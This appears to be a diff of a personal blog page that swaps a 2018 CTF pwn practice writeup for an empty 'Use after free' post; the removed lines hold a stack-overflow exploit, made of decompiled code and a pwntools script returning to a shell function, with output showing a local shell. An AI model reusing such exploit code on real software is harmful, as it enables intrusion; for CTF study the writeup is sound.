@@ -12,7 +12,7 @@
     
     <title>
         
-            Syclover-Pwn-练习题 | 
+            Use after free | 
         
         iosmosis&#39;s blog
     </title>
@@ -36,7 +36,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="iosmosis">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="null,Pwn,栈溢出,writeup,Syclover">
+    <meta name="keywords" content="null">
 
     <!-- Site Verification -->
     
@@ -65,18 +65,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://iosmosis.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Syclover-Pwn-练习题 | iosmosis&#39;s blog">
+    <meta property="og:title" content="Use after free | iosmosis&#39;s blog">
     <meta property="og:image" content="/img/favicon.png" />
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="Pwn"> <meta property="og:article:tag" content="栈溢出"> <meta property="og:article:tag" content="writeup"> <meta property="og:article:tag" content="Syclover"> 
+    
 
     
-        <meta property="article:published_time" content="6月 09, 2018" />
-        <meta property="article:modified_time" content="6月 10, 2018" />
+        <meta property="article:published_time" content="11月 29, 2018" />
+        <meta property="article:modified_time" content="11月 29, 2018" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="Syclover-Pwn-练习题 | iosmosis&#39;s blog">
+    <meta name="twitter:title" content="Use after free | iosmosis&#39;s blog">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -84,7 +84,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html" />
+        <link rel="canonical" href="http://iosmosis.github.io/2018/11/29/Use-after-free/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -110,10 +110,10 @@
         },
         "description": "期待大学生活的二进制菜鸡"
     },
-    "headline": "Syclover-Pwn-练习题",
-    "url": "http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html",
-    "datePublished": "6月 09, 2018",
-    "dateModified": "6月 10, 2018",
+    "headline": "Use after free",
+    "url": "http://iosmosis.github.io/2018/11/29/Use-after-free/index.html",
+    "datePublished": "11月 29, 2018",
+    "dateModified": "11月 29, 2018",
     "description": "",
     "mainEntityOfPage": {
         "@type": "WebPage",
@@ -343,7 +343,7 @@
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#stack1"><span class="post-toc-number">1.</span> <span class="post-toc-text">stack1</span></a></li></ol>
+        
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -381,7 +381,7 @@
         
     
             <p class="article-headline-p">
-                Syclover-Pwn-练习题
+                Use after free
             </p>
         </div>
 
@@ -400,7 +400,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>iosmosis</strong>
-        <span>6月 09, 2018</span>
+        <span>11月 29, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -422,7 +422,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAACzklEQVR42u3awU4jMRAE0Pn/n2avSIhJlXuyCvbzKYIk4+cDTXf5+jpyXdjY2NjY2NjY2Ngfyb7i9f39+eufz7r/ef463zM2Njb2CewXf/pvSfcPyzedfP/anrGxsbHPYedF67f3tIzJN9SfwsbGxsYOCkZbqO5/nrcr2NjY2NhtAbsHtweUtxPY2NjY2POhUl5OEmT+PQ/sGRsbG3tr9vuC3ve9/uh8GxsbG/s/stdW0gw8GyQ/sGdsbGzsTdlJEDsJgPM2I2lj1kJfbGxs7L3Za+P7tRF/C8tJ0SgKGxsbe1N2O7hfO5q18LhtjR4IerGxsbH/ILsNWduNJoUnKW/tBVBsbGzs09jJuCfB3z9+7Wjy8dOLT2FjY2NvzV572KT8JI1KdBEnP1xsbGzsTdlt4zEZJOWBwSQkru+cYmNjY2/BTpBrl2zayKENgLGxsbGx50VrHsTmQ6tJocXGxsY+k50MieYxwFrEW8fA2NjY2Aew26g1LzntRcz20EcFDBsbG3sLdh6sJu9vS8skMC6CamxsbOxN2U8hk0F/W3jaY30xcsLGxsbelL0WtSZH1l6mzBuhdpiFjY2NfQ77fotr8XA0uC+Po72yiY2NjX0CuygDZUOy1pa0DUly0NjY2NjnsNt/95ORfR4etxFFUkqxsbGx92bng6Hkck8b37ZBxWgP2NjY2Mew1zaUxANtDDyJHOoCho2Njf3H2flwPy9Ck0alLXJJMcPGxsY+gb02SJoHADnp4Tun2NjY2Fuw25U0GO07J8OjxaESNjY29kbsK16TEtWWn+S3ecuEjY2NfQJ7XrTeGNAOYglsbGzs09jPlpZ5Q3KVCxsbGxs7Z6+NdfKjWbvK82Kf2NjY2NhxgVkDz4dH2NjY2Nj5dieRcHKUk4bk1wPCxsbG3pq9FvTmyBzWHl9RGrGxsbE3ZZ+zsLGxsbGxsbGxsT9m/QMGZxaoVB0aFwAAAABJRU5ErkJggg==">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACZklEQVR42u3awU7DMBAE0P7/T8MVCRFmbGdJ0cuposHxy8Hejvf18a+vFx4eHh4eHh4e3sN4r/j6fv/Xv/z0bfKU7+OszQ0PDw9vkvfLUhsArv/3+v4cfD03PDw8vHle+5jrpTwf/3q0dm54eHh4T+PlU8+X+LXx8fDw8N6FtxMcJAU6Hh4e3nvxih/8eahaBsEH5oaHh4c3wttZ1u/+/Afne3h4eHiXvLql6XLotmjOxxzqKcPDw8MLeMlU8u1hrShPIt28iQEPDw/vbt7+Ap1vFXVxXLYm4OHh4U3y8qA2+TZvEWi3pegV4OHh4Y3w1sKItkRuw4i2eQsPDw9vhhf9vI8PpfJJJ9tG8vrw8PDw5nl5rLAPSya6Fkng4eHhzfPamCDZMPYD3Px+PDw8vEleHgTkwUR78N+GDnh4eHhP4K0dSq1tMKe+xcPDw3syr13W8xeRl86LrQN4eHh4N/DyxT0vnYtj/qWGgzprwcPDw7uBtxaw5pPO79+fCR4eHt48r31kXgq3JXv76vHw8PBmeGvlcr4BtAt9W6xHWQseHh7eUd5QmbsU5uYzwcPDw5vnnWqcSpB5VJEfoeHh4eFN8tbap9ZeQVIWH2gmwMPDw7uZ117tUVZ+8N9uA0VKjYeHh3eUt3aglRxu5dFDAigCDjw8PLwRXr4ZnApwdwr3IsbFw8PDu5l3KmbNY9z9Rq5iY8DDw8P7I97aQVfbntVuVHh4eHjvwtvfWtqAI4o88PDw8AZ5O4deefF9Pen9sAMPDw9vhrd2ANaOkxToB9oX8PDw8G7m/b8LDw8PDw8PDw/vAdcnhqL3E8HaJvwAAAAASUVORK5CYII=">
     
 </ul>
     
@@ -435,7 +435,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/Pwn/">Pwn</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Syclover/">Syclover</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/writeup/">writeup</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/栈溢出/">栈溢出</a>
+        
     </ul>
     
 
@@ -451,7 +451,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Syclover-Pwn-练习题&url=http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html&pic=&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Use after free&url=http://iosmosis.github.io/2018/11/29/Use-after-free/index.html&pic=&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -460,7 +460,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Syclover-Pwn-练习题&url=http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html&via=iosmosis" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Use after free&url=http://iosmosis.github.io/2018/11/29/Use-after-free/index.html&via=iosmosis" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -490,54 +490,7 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec stack1
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/stack1'</span>
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
-ios@ubuntu:~$
-</code></pre>
-<p>开启NX保护<br>IAD载入分析代码<br>main()</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char v4; // [rsp+0h] [rbp-20h]
-
-  puts(&quot;get input&quot;);
-  scanf(&quot;%s&quot;, &amp;v4);
-  return 0;
-}
-</code></pre><p>get_shell()</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>int get_shell()
-{
-  return system(&quot;/bin/sh&quot;);
-}
-</code></pre><p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack1'</span><span class="token punctuation">)</span>
-sys_addr<span class="token operator">=</span><span class="token number">0x000000000004005B6</span>
-payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p>成功取得shell</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>ios@ubuntu:~$ python stack1.py
-[+] Starting local process &#39;./stack1&#39;: pid 2228
-[*] Switching to interactive mode
-get input
-$ ls
-flag
-$ 
-[*] Interrupted
-[*] Stopped process &#39;./stack1&#39; (pid 2228)
-ios@ubuntu:~$
-</code></pre>
+        
     
 
     
@@ -556,7 +509,7 @@ ios@ubuntu:~$
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/05/13/NPUCTF▓┐╖╓Writeup/" id="post_nav-newer" class="prev-content">
+        <a href="/2018/11/18/kernel-core/" id="post_nav-newer" class="prev-content">
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                 <i class="material-icons">arrow_back</i>
             </button>
@@ -569,14 +522,6 @@ ios@ubuntu:~$
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
-    
-        <a href="/2018/06/10/▒▒╙╩╫╘╒╨╕┤╩╘-CTF-Writeup/" id="post_nav-older" class="next-content">
-            旧篇
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_forward</i>
-            </button>
-        </a>
     
 </nav>
 
